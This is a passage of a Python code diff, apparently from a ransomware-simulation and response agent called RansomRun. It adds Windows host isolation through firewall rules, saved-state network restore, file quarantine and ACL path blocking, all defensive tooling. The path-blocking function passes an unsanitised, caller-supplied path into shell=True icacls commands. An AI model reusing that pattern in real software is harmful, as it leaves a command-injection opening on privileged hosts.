+        DefaultOutboundAction = $_.DefaultOutboundAction.ToString()
+    }
+}
+$profiles | ConvertTo-Json -Compress
+"""
+        success, stdout, stderr = self._run_powershell(ps_command, timeout=30)
+        
+        if not success or not stdout.strip():
+            self.logger.warning(f"[CONTAINMENT] Failed to get firewall profiles: {stderr}")
+            # Return sensible defaults
+            return {
+                "profiles": {
+                    "Domain": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
+                    "Private": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
+                    "Public": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"}
+                },
+                "capture_failed": True
+            }
+        
+        try:
+            # Parse JSON output
+            profiles_list = json.loads(stdout.strip())
+            # Handle single profile (returns object) vs multiple (returns array)
+            if isinstance(profiles_list, dict):
+                profiles_list = [profiles_list]
+            
+            profiles = {}
+            for p in profiles_list:
+                profiles[p["Name"]] = {
+                    "Enabled": p["Enabled"],
+                    "DefaultInboundAction": p["DefaultInboundAction"],
+                    "DefaultOutboundAction": p["DefaultOutboundAction"]
+                }
+            
+            self.logger.info(f"[CONTAINMENT] Captured profiles: {list(profiles.keys())}")
+            return {"profiles": profiles, "capture_failed": False}
+            
+        except json.JSONDecodeError as e:
+            self.logger.warning(f"[CONTAINMENT] JSON parse error: {e}, stdout: {stdout[:500]}")
+            return {
+                "profiles": {
+                    "Domain": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
+                    "Private": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
+                    "Public": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"}
+                },
+                "capture_failed": True
+            }
+
+    def _save_containment_state(self, state: dict) -> bool:
+        """Save containment state to JSON file."""
+        try:
+            state_dir = Path(self.CONTAINMENT_STATE_DIR)
+            state_dir.mkdir(parents=True, exist_ok=True)
+            
+            state_file = Path(self.CONTAINMENT_STATE_FILE)
+            state_file.write_text(json.dumps(state, indent=2))
+            self.logger.info(f"[CONTAINMENT] State saved to {state_file}")
+            return True
+        except Exception as e:
+            self.logger.error(f"[CONTAINMENT] Failed to save state: {e}")
+            return False
+
+    def _load_containment_state(self) -> Optional[dict]:
+        """Load containment state from JSON file. Returns None if not found."""
+        try:
+            state_file = Path(self.CONTAINMENT_STATE_FILE)
+            if not state_file.exists():
+                self.logger.info("[CONTAINMENT] No state file found")
+                return None
+            
+            state = json.loads(state_file.read_text())
+            self.logger.info(f"[CONTAINMENT] State loaded, isolated={state.get('isolated', False)}")
+            return state
+        except Exception as e:
+            self.logger.warning(f"[CONTAINMENT] Failed to load state: {e}")
+            return None
+
+    def _delete_containment_state(self) -> bool:
+        """Delete the containment state file."""
+        try:
+            state_file = Path(self.CONTAINMENT_STATE_FILE)
+            if state_file.exists():
+                state_file.unlink()
+                self.logger.info("[CONTAINMENT] State file deleted")
+            return True
+        except Exception as e:
+            self.logger.warning(f"[CONTAINMENT] Failed to delete state file: {e}")
+            return False
+
+    def _remove_ransomrun_firewall_rules(self) -> dict:
+        """
+        Remove ALL firewall rules with RANSOMRUN_ prefix.
+        Returns dict with count of rules removed and any errors.
+        """
+        self.logger.info("[CONTAINMENT] Removing all RANSOMRUN_ firewall rules...")
+        
+        # Use PowerShell to find and remove all matching rules
+        ps_command = f"""
+$removed = 0
+$errors = @()
+$rules = Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object {{ $_.DisplayName -like '{self.RANSOMRUN_RULE_PREFIX}*' }}
+foreach ($rule in $rules) {{
+    try {{
+        Remove-NetFirewallRule -Name $rule.Name -ErrorAction Stop
+        $removed++
+    }} catch {{
+        $errors += $_.Exception.Message
+    }}
+}}
+@{{ Removed = $removed; Errors = $errors }} | ConvertTo-Json -Compress
+"""
+        success, stdout, stderr = self._run_powershell(ps_command, timeout=30)
+        
+        result = {"removed": 0, "errors": []}
+        if stdout.strip():
+            try:
+                result = json.loads(stdout.strip())
+            except:
+                pass
+        
+        self.logger.info(f"[CONTAINMENT] Removed {result.get('removed', 0)} RANSOMRUN rules")
+        if result.get('errors'):
+            self.logger.warning(f"[CONTAINMENT] Rule removal errors: {result['errors']}")
+        
+        return result
+
+    def _apply_firewall_profile_state(self, profiles: dict) -> bool:
+        """
+        Apply firewall profile settings from saved state.
+        profiles: dict mapping profile name to settings
+        """
+        self.logger.info("[CONTAINMENT] Applying firewall profile states...")
+        
+        all_success = True
+        for profile_name, settings in profiles.items():
+            enabled = settings.get("Enabled", "True")
+            inbound = settings.get("DefaultInboundAction", "Block")
+            outbound = settings.get("DefaultOutboundAction", "Allow")
+            
+            # Map string values to PowerShell enum values
+            enabled_val = "True" if enabled.lower() == "true" else "False"
+            
+            ps_command = f"""
+Set-NetFirewallProfile -Name '{profile_name}' -Enabled {enabled_val} -DefaultInboundAction {inbound} -DefaultOutboundAction {outbound} -ErrorAction Stop
+"""
+            success, stdout, stderr = self._run_powershell(ps_command, timeout=15)
+            
+            if success:
+                self.logger.info(f"[CONTAINMENT] Profile '{profile_name}': Enabled={enabled_val}, In={inbound}, Out={outbound}")
+            else:
+                self.logger.warning(f"[CONTAINMENT] Failed to set profile '{profile_name}': {stderr}")
+                all_success = False
+        
+        return all_success
+
+    def _verify_isolation(self, backend_ip: str, backend_port: int) -> dict:
+        """Verify isolation by testing connectivity."""
+        results = {
+            "backend_reachable": False,
+            "internet_blocked": False,
+            "backend_test_output": "",
+            "internet_test_output": ""
+        }
+        
+        # Test backend connectivity (quick ping test)
+        self.logger.info(f"[CONTAINMENT] Testing backend connectivity to {backend_ip}:{backend_port}...")
+        try:
+            ping = subprocess.run(
+                ["ping", "-n", "1", "-w", "2000", backend_ip],
+                capture_output=True, text=True, timeout=5
+            )
+            results["backend_reachable"] = ping.returncode == 0
+            results["backend_test_output"] = "ping succeeded" if ping.returncode == 0 else "ping failed"
+        except:
+            results["backend_test_output"] = "ping test error"
+        
+        # Test internet (should be blocked)
+        self.logger.info("[CONTAINMENT] Testing internet connectivity (should be blocked)...")
+        try:
+            ping = subprocess.run(
+                ["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
+                capture_output=True, text=True, timeout=5
+            )
+            results["internet_blocked"] = ping.returncode != 0
+            results["internet_test_output"] = "blocked" if ping.returncode != 0 else "NOT blocked"
+        except:
+            results["internet_blocked"] = True
+            results["internet_test_output"] = "test error (assuming blocked)"
+        
+        self.logger.info(f"[CONTAINMENT] Verification: backend_reachable={results['backend_reachable']}, internet_blocked={results['internet_blocked']}")
+        return results
+
+    def containment_isolate_host(self, parameters: dict) -> tuple:
+        """
+        STATEFUL host isolation - blocks all network traffic except backend communication.
+        
+        This implementation:
+        1. Captures EXACT firewall profile state BEFORE isolation (Enabled, DefaultInbound, DefaultOutbound)
+        2. Saves state to C:\\ProgramData\\RansomRun\\containment_state.json
+        3. Creates firewall rules with RANSOMRUN_ prefix for easy cleanup
+        4. Verifies isolation worked
+        5. Is IDEMPOTENT - won't duplicate rules if already isolated
+        
+        Restore will use saved state to revert EXACTLY to pre-isolation configuration.
+        """
+        import time
+        start_time = time.time()
+        
+        run_id = parameters.get("run_id")
+        method = parameters.get("method", "firewall_lockdown")
+        dry_run = parameters.get("dry_run", True)
+        force = parameters.get("force", False)
+        
+        # AUTO-DETECT backend IP from agent's backend_url
+        try:
+            from urllib.parse import urlparse
+            parsed = urlparse(self.backend_url)
+            detected_ip = parsed.hostname or "127.0.0.1"
+            detected_port = parsed.port or 8000
+        except:
+            detected_ip = "127.0.0.1"
+            detected_port = 8000
+        
+        backend_ip = parameters.get("backend_ip", detected_ip)
+        backend_port = parameters.get("backend_port", detected_port)
+        
+        self.logger.info(f"[CONTAINMENT] ===== ISOLATE HOST (STATEFUL) =====")
+        self.logger.info(f"[CONTAINMENT] Backend: {backend_ip}:{backend_port}, DryRun: {dry_run}, Force: {force}")
+        
+        result_data = {
+            "action": "isolate_host",
+            "method": method,
+            "dry_run": dry_run,
+            "backend_ip": backend_ip,
+            "backend_port": backend_port,
+            "commands_executed": [],
+            "verification": None,
+            "error": None,
+            "is_isolated": False
+        }
+        
+        # =====================================================================
+        # DRY RUN - Show what would happen
+        # =====================================================================
+        if dry_run:
+            self.logger.info("[CONTAINMENT] DRY RUN - No changes will be made")
+            result_data["status"] = "dry_run"
+            result_data["commands_planned"] = [
+                "Capture firewall profile states (Get-NetFirewallProfile)",
+                "Save state to containment_state.json",
+                "Set all profiles: DefaultOutboundAction=Block",
+                f"Create RANSOMRUN_BACKEND_OUT rule (allow {backend_ip})",
+                f"Create RANSOMRUN_BACKEND_IN rule (allow {backend_ip})",
+                "Create RANSOMRUN_LOCALHOST_OUT rule (allow 127.0.0.1)",
+                "Create RANSOMRUN_LOCALHOST_IN rule (allow 127.0.0.1)",
+                "Create RANSOMRUN_DNS_OUT rule (allow UDP 53)",
+                "Verify: ping 8.8.8.8 should fail"
+            ]
+            return (True, json.dumps(result_data))
+        
+        # =====================================================================
+        # ADMIN CHECK - Required for firewall changes
+        # =====================================================================
+        if not self._is_admin():
+            self.logger.error("[CONTAINMENT] Administrator privileges required for isolation")
+            result_data["status"] = "failed"
+            result_data["error"] = "Containment requires Administrator privileges. Run agent as Administrator."
+            return (False, json.dumps(result_data))
+        
+        self.logger.info("[CONTAINMENT] Admin check: PASSED")
+        result_data["commands_executed"].append({"step": "admin_check", "ok": True})
+        
+        # =====================================================================
+        # IDEMPOTENCY CHECK - Don't re-isolate if already isolated
+        # =====================================================================
+        existing_state = self._load_containment_state()
+        if existing_state and existing_state.get("isolated", False) and not force:
+            self.logger.info("[CONTAINMENT] Host is already isolated (use force=True to re-isolate)")
+            result_data["status"] = "already_isolated"
+            result_data["is_isolated"] = True
+            result_data["previous_isolation"] = existing_state.get("timestamp")
+            return (True, json.dumps(result_data))
+        
+        # =====================================================================
+        # STEP 1: Capture current firewall state BEFORE making changes
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 1: Capturing pre-isolation firewall state...")
+        fw_state = self._get_firewall_profiles_state()
+        result_data["commands_executed"].append({
+            "step": "capture_state", 
+            "ok": not fw_state.get("capture_failed", False),
+            "profiles_captured": list(fw_state.get("profiles", {}).keys())
+        })
+        
+        if fw_state.get("capture_failed"):
+            self.logger.warning("[CONTAINMENT] State capture had issues, using defaults")
+        
+        # =====================================================================
+        # STEP 2: Remove any existing RANSOMRUN rules (clean slate)
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 2: Cleaning up any existing RANSOMRUN rules...")
+        cleanup_result = self._remove_ransomrun_firewall_rules()
+        result_data["commands_executed"].append({
+            "step": "cleanup_existing_rules",
+            "ok": True,
+            "rules_removed": cleanup_result.get("removed", 0)
+        })
+        
+        # =====================================================================
+        # STEP 3: Enable firewall on all profiles
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 3: Enabling firewall on all profiles...")
+        enable_result = subprocess.run(
+            ["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
+            capture_output=True, text=True, timeout=10
+        )
+        result_data["commands_executed"].append({
+            "step": "enable_firewall",
+            "ok": enable_result.returncode == 0
+        })
+        
+        # =====================================================================
+        # STEP 4: Set BLOCK outbound policy on all profiles (containment)
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 4: Setting outbound BLOCK policy...")
+        block_result = subprocess.run(
+            ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,blockoutbound"],
+            capture_output=True, text=True, timeout=10
+        )
+        
+        if block_result.returncode != 0:
+            self.logger.error(f"[CONTAINMENT] Failed to set block policy: {block_result.stderr}")
+            result_data["status"] = "failed"
+            result_data["error"] = f"Failed to set firewall block policy: {block_result.stderr}"
+            return (False, json.dumps(result_data))
+        
+        result_data["commands_executed"].append({"step": "set_block_policy", "ok": True})
+        
+        # =====================================================================
+        # STEP 5: Create RANSOMRUN allow rules for backend communication
+        # =====================================================================
+        self.logger.info(f"[CONTAINMENT] STEP 5: Creating allow rules for backend {backend_ip}...")
+        
+        rules_to_create = [
+            # Backend outbound - allow agent to talk to backend
+            {
+                "name": "RANSOMRUN_BACKEND_OUT",
+                "args": ["dir=out", "action=allow", f"remoteip={backend_ip}", "protocol=any", "enable=yes"]
+            },
+            # Backend inbound - allow responses from backend
+            {
+                "name": "RANSOMRUN_BACKEND_IN", 
+                "args": ["dir=in", "action=allow", f"remoteip={backend_ip}", "protocol=any", "enable=yes"]
+            },
+            # Localhost outbound
+            {
+                "name": "RANSOMRUN_LOCALHOST_OUT",
+                "args": ["dir=out", "action=allow", "remoteip=127.0.0.1,::1", "protocol=any", "enable=yes"]
+            },
+            # Localhost inbound
+            {
+                "name": "RANSOMRUN_LOCALHOST_IN",
+                "args": ["dir=in", "action=allow", "remoteip=127.0.0.1,::1", "protocol=any", "enable=yes"]
+            },
+            # DNS outbound (needed for hostname resolution if using hostnames)
+            {
+                "name": "RANSOMRUN_DNS_OUT",
+                "args": ["dir=out", "action=allow", "protocol=udp", "remoteport=53", "enable=yes"]
+            }
+        ]
+        
+        rules_created = 0
+        for rule in rules_to_create:
+            cmd = ["netsh", "advfirewall", "firewall", "add", "rule", f"name={rule['name']}"] + rule["args"]
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            if r.returncode == 0:
+                rules_created += 1
+                self.logger.info(f"[CONTAINMENT] Created rule: {rule['name']}")
+            else:
+                self.logger.warning(f"[CONTAINMENT] Failed to create rule {rule['name']}: {r.stderr}")
+        
+        result_data["commands_executed"].append({
+            "step": "create_allow_rules",
+            "ok": rules_created >= 2,  # At minimum need backend rules
+            "rules_created": rules_created,
+            "rules_attempted": len(rules_to_create)
+        })
+        
+        # =====================================================================
+        # STEP 6: Verify isolation
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 6: Verifying isolation...")
+        verification = self._verify_isolation(backend_ip, backend_port)
+        result_data["verification"] = verification
+        
+        internet_blocked = verification.get("internet_blocked", False)
+        backend_reachable = verification.get("backend_reachable", False)
+        
+        # =====================================================================
+        # STEP 7: Save state for restore
+        # =====================================================================
+        elapsed = time.time() - start_time
+        
+        state_to_save = {
+            "isolated": internet_blocked,
+            "method": method,
+            "timestamp": datetime.utcnow().isoformat(),
+            "backend_ip": backend_ip,
+            "backend_port": backend_port,
+            "execution_time_seconds": round(elapsed, 2),
+            "original_firewall_state": fw_state,  # CRITICAL: Save original state for restore
+            "rules_created": [r["name"] for r in rules_to_create]
+        }
+        
+        save_ok = self._save_containment_state(state_to_save)
+        result_data["commands_executed"].append({"step": "save_state", "ok": save_ok})
+        
+        # =====================================================================
+        # RESULT
+        # =====================================================================
+        if internet_blocked:
+            result_data["status"] = "success"
+            result_data["is_isolated"] = True
+            self.logger.info(f"[CONTAINMENT] ===== ISOLATED SUCCESSFULLY in {elapsed:.1f}s =====")
+        else:
+            result_data["status"] = "partial"
+            result_data["is_isolated"] = False
+            result_data["warning"] = "Internet may not be fully blocked"
+            self.logger.warning(f"[CONTAINMENT] Isolation may be incomplete - internet still reachable")
+        
+        result_data["execution_time_seconds"] = round(elapsed, 2)
+        
+        # Report to backend
+        self._report_containment_result(run_id, "isolate_host", False, result_data["commands_executed"], {
+            "isolated": internet_blocked,
+            "backend_reachable": backend_reachable
+        })
+        
+        return (internet_blocked, json.dumps(result_data))
+    
+    def containment_restore_network(self, parameters: dict) -> tuple:
+        """
+        STATEFUL network restore - reverts firewall to EXACT pre-isolation state.
+        
+        This implementation:
+        1. Loads saved state from containment_state.json
+        2. Removes ALL RANSOMRUN_ firewall rules
+        3. Restores EXACT original firewall profile settings (Enabled, DefaultInbound, DefaultOutbound)
+        4. Verifies internet connectivity is restored
+        5. Deletes state file after successful restore
+        
+        Is IDEMPOTENT - safe to call multiple times, returns success if not isolated.
+        """
+        import time
+        start_time = time.time()
+        
+        run_id = parameters.get("run_id")
+        dry_run = parameters.get("dry_run", True)
+        force = parameters.get("force", False)
+        
+        self.logger.info(f"[CONTAINMENT] ===== RESTORE NETWORK (STATEFUL) =====")
+        self.logger.info(f"[CONTAINMENT] DryRun: {dry_run}, Force: {force}")
+        
+        result_data = {
+            "action": "restore_network",
+            "dry_run": dry_run,
+            "commands_executed": [],
+            "verification": None,
+            "error": None,
+            "is_isolated": True  # Assume still isolated until proven otherwise
+        }
+        
+        # =====================================================================
+        # LOAD SAVED STATE
+        # =====================================================================
+        saved_state = self._load_containment_state()
+        
+        # =====================================================================
+        # DRY RUN - Show what would happen
+        # =====================================================================
+        if dry_run:
+            self.logger.info("[CONTAINMENT] DRY RUN - No changes will be made")
+            result_data["status"] = "dry_run"
+            
+            if saved_state:
+                original_profiles = saved_state.get("original_firewall_state", {}).get("profiles", {})
+                result_data["commands_planned"] = [
+                    "Remove all RANSOMRUN_* firewall rules",
+                    f"Restore firewall profiles: {list(original_profiles.keys())}",
+                    "For each profile: restore Enabled, DefaultInboundAction, DefaultOutboundAction",
+                    "Verify: ping 8.8.8.8 should succeed",
+                    "Delete containment_state.json"
+                ]
+                result_data["original_state_found"] = True
+            else:
+                result_data["commands_planned"] = [
+                    "No saved state found - will use safe defaults",
+                    "Remove all RANSOMRUN_* firewall rules",
+                    "Set default outbound policy to Allow",
+                    "Verify connectivity"
+                ]
+                result_data["original_state_found"] = False
+            
+            return (True, json.dumps(result_data))
+        
+        # =====================================================================
+        # ADMIN CHECK - Required for firewall changes
+        # =====================================================================
+        if not self._is_admin():
+            self.logger.error("[CONTAINMENT] Administrator privileges required for restore")
+            result_data["status"] = "failed"
+            result_data["error"] = "Restore requires Administrator privileges. Run agent as Administrator."
+            return (False, json.dumps(result_data))
+        
+        self.logger.info("[CONTAINMENT] Admin check: PASSED")
+        result_data["commands_executed"].append({"step": "admin_check", "ok": True})
+        
+        # =====================================================================
+        # IDEMPOTENCY CHECK - If not isolated, nothing to do
+        # =====================================================================
+        if not saved_state and not force:
+            self.logger.info("[CONTAINMENT] No saved state found - host may not be isolated")
+            result_data["status"] = "not_isolated"
+            result_data["is_isolated"] = False
+            result_data["message"] = "No isolation state found. Host appears to not be isolated."
+            return (True, json.dumps(result_data))
+        
+        if saved_state and not saved_state.get("isolated", False) and not force:
+            self.logger.info("[CONTAINMENT] State shows host is not isolated")
+            result_data["status"] = "not_isolated"
+            result_data["is_isolated"] = False
+            return (True, json.dumps(result_data))
+        
+        # =====================================================================
+        # STEP 1: Remove ALL RANSOMRUN firewall rules
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 1: Removing all RANSOMRUN_ firewall rules...")
+        cleanup_result = self._remove_ransomrun_firewall_rules()
+        result_data["commands_executed"].append({
+            "step": "remove_ransomrun_rules",
+            "ok": True,
+            "rules_removed": cleanup_result.get("removed", 0)
+        })
+        
+        # Also clean up any legacy rules that might exist
+        legacy_rules = ["RANSOMRUN_OUT", "RANSOMRUN_IN", "RANSOMRUN_LO_OUT", "RANSOMRUN_LO_IN", "ALLOW_ALL_OUT"]
+        for rule in legacy_rules:
+            subprocess.run(
+                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule}"],
+                capture_output=True, timeout=5
+            )
+        
+        # =====================================================================
+        # STEP 2: Restore original firewall profile states
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 2: Restoring original firewall profile states...")
+        
+        profiles_restored = False
+        if saved_state and "original_firewall_state" in saved_state:
+            original_fw = saved_state["original_firewall_state"]
+            profiles = original_fw.get("profiles", {})
+            
+            if profiles and not original_fw.get("capture_failed", False):
+                self.logger.info(f"[CONTAINMENT] Restoring profiles: {list(profiles.keys())}")
+                profiles_restored = self._apply_firewall_profile_state(profiles)
+                result_data["commands_executed"].append({
+                    "step": "restore_profiles",
+                    "ok": profiles_restored,
+                    "profiles": list(profiles.keys())
+                })
+            else:
+                self.logger.warning("[CONTAINMENT] No valid original profiles in saved state, using defaults")
+        
+        # If no saved state or restore failed, apply safe defaults
+        if not profiles_restored:
+            self.logger.info("[CONTAINMENT] Applying safe default profile settings...")
+            
+            # Safe defaults: firewall enabled, block inbound, ALLOW outbound
+            default_profiles = {
+                "Domain": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
+                "Private": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
+                "Public": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"}
+            }
+            
+            profiles_restored = self._apply_firewall_profile_state(default_profiles)
+            result_data["commands_executed"].append({
+                "step": "apply_default_profiles",
+                "ok": profiles_restored,
+                "note": "Applied safe defaults (outbound allowed)"
+            })
+        
+        # =====================================================================
+        # STEP 3: Verify internet connectivity is restored
+        # =====================================================================
+        self.logger.info("[CONTAINMENT] STEP 3: Verifying internet connectivity...")
+        internet_restored = False
+        
+        # Give firewall a moment to apply changes
+        time.sleep(1)
+        
+        try:
+            ping = subprocess.run(
+                ["ping", "-n", "2", "-w", "2000", "8.8.8.8"],
+                capture_output=True, text=True, timeout=10
+            )
+            internet_restored = ping.returncode == 0
+            self.logger.info(f"[CONTAINMENT] Ping test: {'SUCCESS' if internet_restored else 'FAILED'}")
+        except Exception as e:
+            self.logger.warning(f"[CONTAINMENT] Ping test error: {e}")
+        
+        result_data["verification"] = {"internet_restored": internet_restored}
+        
+        # =====================================================================
+        # STEP 4: If still blocked, try additional recovery steps
+        # =====================================================================
+        if not internet_restored:
+            self.logger.warning("[CONTAINMENT] Internet still blocked, trying additional recovery...")
+            
+            # Try setting outbound to allow explicitly via netsh
+            subprocess.run(
+                ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,allowoutbound"],
+                capture_output=True, timeout=10
+            )
+            result_data["commands_executed"].append({"step": "force_allow_outbound", "ok": True})
+            
+            # Test again
+            time.sleep(1)
+            try:
+                ping2 = subprocess.run(
+                    ["ping", "-n", "2", "-w", "2000", "8.8.8.8"],
+                    capture_output=True, timeout=10
+                )
+                internet_restored = ping2.returncode == 0
+            except:
+                pass
+            
+            result_data["verification"]["internet_restored_after_recovery"] = internet_restored
+        
+        # =====================================================================
+        # STEP 5: Delete state file (mark as restored)
+        # =====================================================================
+        if internet_restored:
+            self.logger.info("[CONTAINMENT] STEP 5: Cleaning up state file...")
+            self._delete_containment_state()
+            result_data["commands_executed"].append({"step": "delete_state_file", "ok": True})
+        
+        # =====================================================================
+        # RESULT
+        # =====================================================================
+        elapsed = time.time() - start_time
+        
+        if internet_restored:
+            result_data["status"] = "success"
+            result_data["is_isolated"] = False
+            self.logger.info(f"[CONTAINMENT] ===== RESTORED SUCCESSFULLY in {elapsed:.1f}s =====")
+        else:
+            result_data["status"] = "partial"
+            result_data["is_isolated"] = True  # May still be partially isolated
+            result_data["warning"] = "Internet connectivity may not be fully restored"
+            self.logger.warning(f"[CONTAINMENT] Restore incomplete - internet may still be blocked")
+        
+        result_data["execution_time_seconds"] = round(elapsed, 2)
+        
+        # Report to backend
+        self._report_containment_result(run_id, "restore_network", False, result_data["commands_executed"], {
+            "restored": internet_restored,
+            "is_isolated": not internet_restored
+        })
+        
+        return (True, json.dumps(result_data))
+    
+    def containment_block_path(self, parameters: dict) -> tuple:
+        """Block a file/directory path using ACLs."""
+        run_id = parameters.get("run_id")
+        path = parameters.get("path")
+        mode = parameters.get("mode", "acl_deny")
+        dry_run = parameters.get("dry_run", True)
+        
+        if not path:
+            return (False, "Path is required")
+        
+        self.logger.info(f"[CONTAINMENT] Blocking path: {path} (mode={mode}, dry_run={dry_run})")
+        
+        commands = []
+        target_path = Path(path)
+        
+        if mode == "quarantine_and_deny":
+            # Move to quarantine first
+            quarantine_dir = Path(r"C:\ProgramData\RansomRun\Quarantine")
+            quarantine_dir.mkdir(parents=True, exist_ok=True)
+            
+            timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+            quarantine_path = quarantine_dir / f"{timestamp}_{target_path.name}"
+            
+            commands.append({
+                "type": "move",
+                "source": str(target_path),
+                "dest": str(quarantine_path)
+            })
+            
+            if not dry_run and target_path.exists():
+                try:
+                    shutil.move(str(target_path), str(quarantine_path))
+                    target_path = quarantine_path
+                except Exception as e:
+                    return (False, f"Failed to move to quarantine: {e}")
+        
+        # Apply ACL deny
+        acl_commands = [
+            f'icacls "{target_path}" /inheritance:r',
+            f'icacls "{target_path}" /deny Everyone:(RX)'
+        ]
+        
+        for cmd in acl_commands:
+            commands.append({"type": "cmd", "command": cmd})
+        
+        if not dry_run:
+            try:
+                for cmd in acl_commands:
+                    result = subprocess.run(
+                        cmd,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=30
+                    )
+                    if result.returncode != 0:
+                        self.logger.warning(f"ACL command warning: {result.stderr}")
+            except Exception as e:
+                return (False, f"ACL block error: {e}")
+        
+        self._report_containment_result(run_id, "block_path", dry_run, commands, {"path": path, "mode": mode})
+        
+        status = "dry_run" if dry_run else "success"
+        return (True, json.dumps({
+            "action": "block_path",
+            "path": path,
+            "mode": mode,
+            "status": status,
+            "commands": commands
+        }))
+    
+    def containment_quarantine_file(self, parameters: dict) -> tuple:
+        """Move a file to quarantine location."""
+        run_id = parameters.get("run_id")
+        path = parameters.get("path")
+        dry_run = parameters.get("dry_run", True)
+        
+        if not path:
+            return (False, "Path is required")
+        
+        self.logger.info(f"[CONTAINMENT] Quarantining file: {path} (dry_run={dry_run})")
+        
+        source_path = Path(path)
+        quarantine_dir = Path(r"C:\ProgramData\RansomRun\Quarantine")
+        quarantine_dir.mkdir(parents=True, exist_ok=True)
+        
+        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+        quarantine_path = quarantine_dir / f"{timestamp}_{source_path.name}"
+        
+        commands = [{
+            "type": "move",
+            "source": str(source_path),
+            "dest": str(quarantine_path)
+        }]
+        
+        if not dry_run:
+            if not source_path.exists():
+                return (False, f"File not found: {path}")
+            
+            try:
+                shutil.move(str(source_path), str(quarantine_path))
+            except Exception as e:
+                return (False, f"Quarantine error: {e}")
+        
+        self._report_containment_result(run_id, "quarantine_file", dry_run, commands, {"path": path})
+        
+        status = "dry_run" if dry_run else "success"
+        return (True, json.dumps({
+            "action": "quarantine_file",
+            "source": str(source_path),
+            "destination": str(quarantine_path),
+            "status": status,
+            "commands": commands
+        }))
+    
+    def _report_containment_result(self, run_id: Optional[int], action: str, dry_run: bool, commands: list, extra: dict = None):
+        """Report containment action result to backend."""
+        if not run_id:
+            return
+        
+        try:
+            payload = {
+                "run_id": run_id,
+                "action": action,
+                "status": "dry_run" if dry_run else "success",
+                "commands": commands,
+                "details": extra or {}
+            }
+            
+            # This would trigger the appropriate event on the backend
+            # For now, the task result handles this
+            self.logger.info(f"Containment action {action} completed: {payload}")
+            
+        except Exception as e:
+            self.logger.warning(f"Failed to report containment result: {e}")
+    
+    # =========================================================================
+    # SOAR NETWORK ISOLATION/RESTORE (Robust Implementation)
+    # =========================================================================
+    
+    def soar_isolate_host(self, parameters: dict) -> tuple:
+        """
+        Robust host isolation with comprehensive state capture.
+        
+        This implementation:
+        1. Checks admin privileges
+        2. Captures complete network state (adapters, IPs, DNS, gateway)
+        3. Stores state locally for recovery after reboot
+        4. Applies isolation based on mode (firewall or adapter)
+        5. Verifies isolation succeeded
+        6. Reports results back to backend
+        """
+        import time
+        import hashlib
+        start_time = time.time()
+        
+        mode = parameters.get("mode", "firewall")
+        dry_run = parameters.get("dry_run", False)
+        allow_backend = parameters.get("allow_backend", True)
+        backend_config = parameters.get("backend_allow", {})
+        backend_ip = backend_config.get("ip", "127.0.0.1")
+        backend_ports = backend_config.get("ports", [8000])
+        isolation_state_id = parameters.get("isolation_state_id")
+        
+        self.logger.info(f"[SOAR] ===== ISOLATE HOST =====")
+        self.logger.info(f"[SOAR] Mode: {mode}, Backend: {backend_ip}:{backend_ports}, DryRun: {dry_run}")
+        
+        # Result structure
+        result = {
+            "success": False,
+            "message": "",
+            "mode": mode,
+            "pre_state": None,
+            "post_state": None,
+            "commands": [],
+            "stdout": "",
+            "stderr": "",
+            "errors": [],
+            "verification_passed": False,
+            "verification_details": {},
+            "duration_seconds": 0,
+            "isolation_state_id": isolation_state_id
+        }
+        
+        # Setup data directory
+        data_dir = Path(r"C:\ProgramData\RansomRun")
+        data_dir.mkdir(parents=True, exist_ok=True)
+        state_file = data_dir / "isolation_state.json"
+        
+        # STEP 1: Check admin privileges
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            is_admin = False
+        
+        if not is_admin:
+            result["errors"].append("Administrator privileges required for network isolation")
+            result["message"] = "FAILED: Not running as Administrator"
+            return (False, json.dumps(result))
+        
+        # STEP 2: Capture pre-isolation network state
+        self.logger.info("[SOAR] Capturing network state...")
+        pre_state = self._soar_capture_network_state()
+        result["pre_state"] = pre_state
+        
+        if dry_run:
+            result["success"] = True
+            result["message"] = f"[DRY RUN] Would isolate host with mode: {mode}"
+            result["duration_seconds"] = round(time.time() - start_time, 2)
+            return (True, json.dumps(result))
+        
+        # STEP 3: Apply isolation based on mode
+        if mode == "firewall":
+            isolation_result = self._soar_apply_firewall_isolation(backend_ip, backend_ports, allow_backend)
+        elif mode == "adapter":
+            isolation_result = self._soar_apply_adapter_isolation(pre_state, backend_ip)
+        elif mode == "hybrid":
+            # Apply both firewall and adapter isolation
+            fw_result = self._soar_apply_firewall_isolation(backend_ip, backend_ports, allow_backend)
+            adapter_result = self._soar_apply_adapter_isolation(pre_state, backend_ip)
+            isolation_result = {
+                "success": fw_result["success"] and adapter_result["success"],
+                "commands": fw_result["commands"] + adapter_result["commands"],
+                "stdout": fw_result["stdout"] + adapter_result["stdout"],
+                "stderr": fw_result["stderr"] + adapter_result["stderr"],
